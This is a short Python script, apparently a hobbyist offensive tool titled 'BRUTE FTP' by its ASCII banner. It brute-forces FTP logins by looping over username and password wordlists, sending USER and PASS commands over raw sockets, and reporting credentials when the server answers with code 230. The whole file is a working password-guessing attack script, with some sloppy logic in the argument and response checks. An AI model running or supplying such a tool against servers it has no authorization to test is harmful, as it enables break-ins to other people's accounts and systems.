import socket, re
from sys import argv
from os import system
text = '''
 ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████      █████▒▄▄▄█████▓ ██▓███  
▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓██   ▒ ▓  ██▒ ▓▒▓██░  ██▒
▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███      ▒████ ░ ▒ ▓██░ ▒░▓██░ ██▓▒
▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ░▓█▒  ░ ░ ▓██▓ ░ ▒██▄█▓▒ ▒
░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒█░      ▒██▒ ░ ▒██▒ ░  ░
░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░    ▒ ░      ▒ ░░   ▒▓▒░ ░  ░
▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░    ░          ░    ░▒ ░     
 ░    ░   ░░   ░  ░░░ ░ ░   ░         ░       ░ ░      ░      ░░       
 ░         ░        ░                 ░  ░                             
      ░                                                                
 '''
system('clear')
print(f'\033[1:35m{text}') # color and style usage
try: 
    host = argv[1]
    port = argv[2]
    user_wordlist = argv[3]
    pass_wordlist = argv[4]

    if len(argv) < 2:
        print('HOW TO USE: python3 bruteforceftp.py <host> <port> <user_wordlist> <pass_wordlist>')

    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # sock.connect((str.encode(host), int(port)))
    # data = sock.recv(1024)



    # convert_data = str(data)
    access_UW = open(user_wordlist, 'r').readlines()
    access_PW = open(pass_wordlist, 'r').readlines()

    for line_u in access_UW:
        for line_p in access_PW:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((str.encode(host), int(port)))
            data_main = sock.recv(1024)
            print(f'[*] Testing...\n User: {line_u} Pass: {line_p}')
        
            user_send = sock.send(str.encode('USER '+ line_u +'\r\n'))
            user_send_data = sock.recv(1024)
        
            pass_send = sock.send(str.encode(f'PASS '+ line_p + '\r\n'))
            pass_send_data = sock.recv(1024)
        
            str_user = str(user_send_data)
            str_pass = str(pass_send_data)
        
            response_u = str_user
            response_p = str_pass
            # print(response_u, response_p)
           
            if re.search('230', response_u and response_p):
                print(f'[*]MATCHING\n USER: {line_u} PASS:{line_p}')
                exit()

except Exception as error_name:
    print(f'Error By: {error_name}')
    print('-'*15,'\nHow to use: python3 bruteforceftp.py <host> <port> <user_wordlist> <pass_wordlist> ')
